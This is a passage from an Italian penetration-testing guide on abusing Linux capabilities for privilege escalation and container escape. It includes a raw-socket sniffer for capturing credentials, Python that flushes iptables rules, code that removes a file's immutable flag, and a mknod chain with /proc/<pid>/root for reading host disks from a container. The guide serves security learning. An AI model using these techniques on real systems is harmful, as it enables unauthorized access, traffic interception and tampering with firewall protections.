conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) consente ai processi di **creare socket RAW e PACKET**, permettendo loro di generare e inviare pacchetti di rete arbitrari. Questo può comportare rischi per la sicurezza negli ambienti containerizzati, come packet spoofing, iniezione di traffico e aggiramento dei controlli di accesso alla rete. Gli attori malevoli potrebbero sfruttare questa funzionalità per interferire con il routing dei container o compromettere la sicurezza della rete host, soprattutto in assenza di adeguate protezioni firewall. Inoltre, **CAP_NET_RAW** supporta operazioni come il ping tramite richieste ICMP RAW.<sup>[[14]](#references)</sup>

**Questo può consentire la cattura di pacchetti tramite un'interfaccia socket adeguata.** Non concede direttamente privilegi più ampi né permette l'escalation dei privilegi.<sup>[[14]](#references)</sup>

Per una possibile esposizione di credenziali, verifica anche che l'account corrente possa eseguire uno strumento di cattura con capability effettive, che il traffico pertinente attraversi un'interfaccia visibile nel suo network namespace e che i dati di autenticazione vengano trasmessi in chiaro. Per esempio, le credenziali HTTP Basic trasmesse su HTTP non crittografato possono essere osservate su loopback se lo strumento di cattura può accedere a tale interfaccia. Il passaggio a un altro account richiede inoltre che le credenziali catturate siano valide per un'altra identità; una file capability o una richiesta di login visibile, da sole, non dimostrano il riutilizzo della password.

Su un host wireless, la presenza di uno strumento di audit WPS eseguibile come `reaver` con `CAP_NET_RAW` effettiva, insieme a un AP e a un'interfaccia in modalità monitor visibili tramite `iw dev`, è un altro indizio da verificare. **Non** prova che sia possibile effettuare un'escalation: l'AP deve esporre l'autenticazione WPS PIN senza un blocco efficace, essere raggiungibile dall'interfaccia wireless e rivelare una PSK; i privilegi sull'host cambiano solo se tale PSK viene riutilizzata per un account. L'enumerazione passiva dovrebbe riportare le modalità e le capability delle interfacce, senza trasmettere probe né provare PIN. Consulta [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755) per la vulnerabilità del WPS PIN e la [documentazione del progetto Reaver](https://github.com/shift/reaver-wps) per il comportamento dello strumento.

**Esempio con un binario**

Se il binario **`tcpdump`** dispone di questa capability, potrai usarlo per catturare informazioni di rete.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

Se l'**ambiente** concede questa capability, anche **`tcpdump`** può usarla per sniffare il traffico.<sup>[[14]](#references)</sup>

**Esempio con binario 2**

Il seguente esempio è codice **`python2`** che può essere utile per intercettare il traffico dell'interfaccia "**lo**" (**localhost**). Il codice proviene dal lab "_The Basics: CAP-NET_BIND + NET_RAW_" su [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) conferisce al possessore il potere di **modificare le configurazioni di rete**, incluse le impostazioni del firewall, le tabelle di routing, i permessi dei socket e le impostazioni delle interfacce di rete nel network namespace corrente. Può anche abilitare la modalità promiscua su un'interfaccia in quel namespace; ciò può esporre il traffico ricevuto da tale interfaccia, ma non consente di per sé di sniffare interfacce arbitrarie in altri network namespace.<sup>[[14]](#references)</sup>

Queste operazioni interessano il **network namespace corrente** del processo. Per controllare lo stato della rete dell'host è necessario usare `--network=host`, `hostNetwork: true` in Kubernetes oppure un meccanismo separato per entrare nel namespace. `CAP_NET_RAW` da solo non fornisce una shell generica sull'host, ma è stato coinvolto in una fuga documentata e specifica per un protocollo: una catena storica su GCE combinava root, il network namespace dell'host, `CAP_NET_ADMIN`, `CAP_NET_RAW`, traffico in chiaro verso i metadata e una richiesta raceable al guest agent per iniettare una chiave SSH. Consulta [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) per tutti i prerequisiti e le limitazioni dei metadata via HTTPS nelle versioni moderne.

**Esempio con un binario**

Supponiamo che il **binario python** abbia queste capabilities.

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP_LINUX_IMMUTABLE

**Questa capacità consente di modificare i flag degli inode, come immutable e append-only.** Non concede direttamente privilegi più ampi per l’escalation dei privilegi.<sup>[[14]](#references)</sup>

**Esempio con un binario**

Se trovi un file immutable e python dispone di questa capacità, puoi **rimuovere l’attributo immutable e rendere modificabile il file:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
    f.write('New content for the file\n')
```

Le operazioni `FS_IOC_GETFLAGS` e `FS_IOC_SETFLAGS` leggono e aggiornano i flag dell'inode; `FS_IMMUTABLE_FL` è il flag di immutabilità che questo esempio cancella.<sup>[[27]](#references)</sup>

> [!TIP]
> Nota che di solito questo attributo di immutabilità viene impostato e rimosso usando:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) consente l’esecuzione della system call `chroot(2)`, che può permettere l’escape da una jail `chroot(2)` costruita in modo debole tramite tecniche note.<sup>[[11]](#references)[[14]](#references)</sup>

Questa è una **capability per l’escape da una chroot jail, non un escape autonomo da un container all’host**. Non espone il filesystem dell’host né ne aggira i permessi. Se la root dell’host è già montata o raggiungibile tramite `/proc/<pid>/root`, `chroot()` si limita a impostare quell’albero esistente come root dei percorsi del processo. Separatamente, modificare i mount namespace con `setns(2)` richiede sia `CAP_SYS_CHROOT` sia `CAP_SYS_ADMIN` nel user namespace del chiamante, oltre a `CAP_SYS_ADMIN` nel user namespace proprietario del mount namespace di destinazione.<sup>[[14]](#references)</sup>

- [Come uscire da varie soluzioni chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: tool per l’escape da chroot](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) consente l’esecuzione della system call `reboot(2)` per riavviare il sistema, anche con comandi come `LINUX_REBOOT_CMD_RESTART2`; abilita inoltre `kexec_load(2)` e, da Linux 3.17 in poi, `kexec_file_load(2)` per caricare rispettivamente nuovi crash kernel o crash kernel firmati.<sup>[[14]](#references)</sup>

All’interno di un PID namespace privato, una richiesta `reboot()` supportata termina il processo init di quel namespace invece di riavviare l’host. L’impatto sul riavvio dell’host richiede quindi il PID namespace iniziale, normalmente tramite la condivisione dei PID dell’host. Una takeover basata su kexec richiede inoltre un’immagine compatibile, una syscall disponibile e policy di lockdown e firma permissive. Non attivare nessuna delle due operazioni su un host condiviso solo per verificare la capability:

```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) è stata separata dalla più ampia **CAP_SYS_ADMIN** in Linux 2.6.37, concedendo nello specifico la possibilità di usare la chiamata `syslog(2)`. Questa capability consente di visualizzare gli indirizzi del kernel tramite `/proc` e interfacce simili quando l'impostazione `kptr_restrict` è a 1, controllando così l'esposizione degli indirizzi del kernel. Da Linux 2.6.39, il valore predefinito di `kptr_restrict` è 0, il che significa che gli indirizzi del kernel sono esposti, sebbene molte distribuzioni lo impostino a 1 (nascondendo gli indirizzi a tutti tranne che a uid 0) o a 2 (nascondendo sempre gli indirizzi) per motivi di sicurezza.<sup>[[14]](#references)</sup>

Inoltre, **CAP_SYSLOG** consente di accedere all'output di `dmesg` quando `dmesg_restrict` è impostato a 1. Nonostante queste modifiche, **CAP_SYS_ADMIN** mantiene la possibilità di eseguire operazioni `syslog` per ragioni storiche.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) estende le funzionalità della chiamata di sistema `mknod` oltre alla creazione di file regolari, FIFO (pipe denominate) o socket di dominio UNIX. Consente nello specifico di creare file speciali, tra cui:<sup>[[14]](#references)</sup>

- **S_IFCHR**: file speciali a caratteri, ovvero dispositivi come i terminali.
- **S_IFBLK**: file speciali a blocchi, ovvero dispositivi come i dischi.

Questa capability è utile per i processi che devono creare file di dispositivo, inclusi i dispositivi a caratteri o a blocchi.<sup>[[14]](#references)</sup>

È inclusa nell'insieme predefinito di capability documentato di Docker; verifica la configurazione effettiva del runtime invece di presumere che ogni deployment usi gli stessi valori predefiniti ([elenco predefinito delle capability di Moby](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Per un container escape, `CAP_MKNOD` può creare un handle mancante verso un dispositivo host reale, ma **non** crea il dispositivo sottostante e **non** aggira il device cgroup. La catena completa richiede:

1. `CAP_MKNOD` effettiva nel namespace utente iniziale, perché la creazione dei dispositivi non è namespaced.
2. Il tipo corretto, a blocchi o a caratteri, e i numeri major/minor di un dispositivo host reale.
3. L'autorizzazione del device cgroup ad aprire quel dispositivo.
4. Un lettore compatibile con il filesystem, oppure `CAP_SYS_ADMIN` per montare un filesystem a blocchi.
5. L'autorizzazione del filesystem e dell'LSM per creare e usare il nodo.

Per un dispositivo a blocchi di laboratorio con filesystem di tipo ext e numeri major/minor reali `252:1`, una verifica in sola lettura è:

```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Sostituisci i numeri con quelli riportati da `/sys/class/block/<device>/dev`. Se la creazione del nodo riesce ma l'apertura restituisce `Operation not permitted`, il device cgroup sta ancora bloccando l'accesso. Questo è il risultato normale in un container che dispone solo del `CAP_MKNOD` predefinito di Docker, senza un'autorizzazione esplicita per il dispositivo.

Esiste anche una distinta tecnica di **local privilege escalation a due foothold**, da non confondere con l'accesso diretto ai dispositivi del container. Un processo root in un container che condivide lo user namespace iniziale può creare un nodo di dispositivo a blocchi, mentre una shell non privilegiata sull'host con un UID corrispondente apre quel nodo tramite `/proc/<container-pid>/root`. L'apertura viene quindi valutata nel cgroup della shell sull'host, perciò il diniego del device cgroup del container non protegge più il dispositivo.<sup>[[7]](#references)</sup>

All'interno del container, crea il nodo e mantieni in esecuzione un processo con l'UID del foothold esistente sull'host:

```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
  useradd -u "$host_uid" -M htbridge
  bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```

Dalla shell host esistente con quell'UID, individua il PID host del processo del container in stato di sleep e usa la sua root procfs come percorso del dispositivo:

```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```

Questa chain richiede entrambi i foothold, uno user namespace con mappatura identica o condiviso, il permesso di attraversare `/proc/<pid>/root` del target, un dispositivo reale con i numeri major/minor corretti e un cgroup esterno che consenta l'apertura. `hidepid`, le regole di accesso ptrace, un LSM, un'incompatibilità del filesystem o la rimappatura dello user namespace possono impedirla. La tecnica storica è preziosa proprio perché spiega come `/proc/<pid>/root` possa aggirare la restrizione del device cgroup del *container*; non sostiene che `CAP_MKNOD` da solo permetta di evadere da un container normalmente isolato.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Nei kernel Linux attuali con file capabilities, **`CAP_SETPCAP`** consente a un thread di aggiungere al proprio insieme inheritable capabilities presenti nel proprio bounding set, rimuovere capabilities dal proprio bounding set e modificare i propri securebits. Non consente a un processo di concedere arbitrariamente capabilities a un altro processo; questo comportamento si applica solo ai kernel precedenti alla versione 2.6.25, privi del supporto per le file capabilities.<sup>[[14]](#references)</sup>

La system call `capset()` può modificare gli insiemi effective, permitted e inheritable di un thread, ma il nuovo insieme permitted non può contenere capabilities assenti da quello permitted esistente e gli aggiornamenti dell'insieme inheritable restano soggetti ai vincoli del kernel.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Laboratori di escalation dei privilegi con Linux capabilities](https://attackdefense.pentesteracademy.com)
- [2] [Grimorio dell'hacker - Escalation dei privilegi in Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Nozioni di base sui Linux container: capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Sfruttare le Linux capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Capabilities eccessive](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Abuso dell'accesso ai mount namespace tramite /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux capabilities: perché esistono e come funzionano](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Comprendere le capabilities in Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC per aggirare seccomp se ptrace è consentito](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Come evadere da varie soluzioni chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - exploit originale di evasione da Docker tramite CAP_DAC_READ_SEARCH di Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Analisi di un exploit di evasione da Docker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Pagina del manuale Ubuntu](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Esecuzione dei container - Documentazione Docker](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Documentazione Docker](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
